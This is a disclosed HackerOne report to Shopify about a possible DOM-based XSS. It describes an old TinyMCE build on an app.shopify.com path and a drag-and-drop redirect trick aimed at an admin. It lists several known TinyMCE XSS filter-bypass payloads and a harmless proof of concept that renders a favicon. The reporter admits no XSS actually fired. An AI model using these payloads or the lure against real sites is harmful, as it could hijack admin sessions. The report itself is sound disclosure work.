@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/262230
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/jelmer
+ReportedTo:Shopify(shopify)
+BountyAmount:2000.0
+Severity:medium
+State:Closed
+DateOfDisclosure:26.09.2017 14:46:20
+
+Summary:
+
+Hello,
+
+The following url
+  * https://app.shopify.com//services/mobile_app/rte
+
+Loads https://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js which is a minified tinymce 2.4.0.
+
+This version of tinymce has known vulnerabilities but in order to trigger them the attacker needs access to tinymce's functionality. To achieve this I came up with a drag drop scenario which goes as follows:
+  * Attacker lures Shopify admin to controlled website
+  * Attacker convinces admin to drag element on the page which has an ondragstart prop with event.dataTransfer.setData+text/html mime (event.dataTransfer.setData('text/html', payload))
+  * Immediatly after the drag the attacker redirects the user to Shopify. This does not violate the XFO 'DENY' setting (https://app.shopify.com//services/mobile_app/rte)
+  * Victim releases the mouse button after loading the tinymce and the dragged data gets rendered by tinymce (tinymce is fullscreen so it doesn't matter where you drop it on the screen)
+
+While I couldn't get a tinymce XSS to trigger it does illustrate an attacker can make tinymce render something. Underneath are the vulnerabilities I tried with associated payload.
+
+[XSS through a href data url](https://github.com/cybersecurityworks/Disclosed/issues/10)
+
+```
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=" target="_blank">Firfox</a>
+```
+[Filter confusion 1](https://github.com/tinymce/tinymce/issues/3114)
+```
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+```
+[Filter confusion 2](https://hackerone.com/reports/81736) and [here](https://github.com/tinymce/tinymce/issues/2356)
+```
+<HTML xmlns: ><audio>
+<audio src=wp onerror=alert(0X1)>
+```
+[Filter confusion 3](https://github.com/tinymce/tinymce/issues/2132)
+```
+&ltg;?">&ltg;iframe SRC=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41>?>
+```
+
+While unable to create a proper PoC the availability of the vulnerable library presented in the way it is might be of your interest.
+
+Here is the poc:
+```
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/html', '<img src=\'https://cdn.shopify.com/shopify-marketing_assets/static/shopify-favicon.png\'/>'); document.location='https://app.shopify.com//services/mobile_app/rte'">drag</div>
+```
+Save that as a html file, open with firefox, drag the div and release it after the page redirected. Tinymce will then render the favicon.
+
+Considering the things that live under this subdomain + CSRF token handout on page successful exploitation of this could get pretty disastrous.
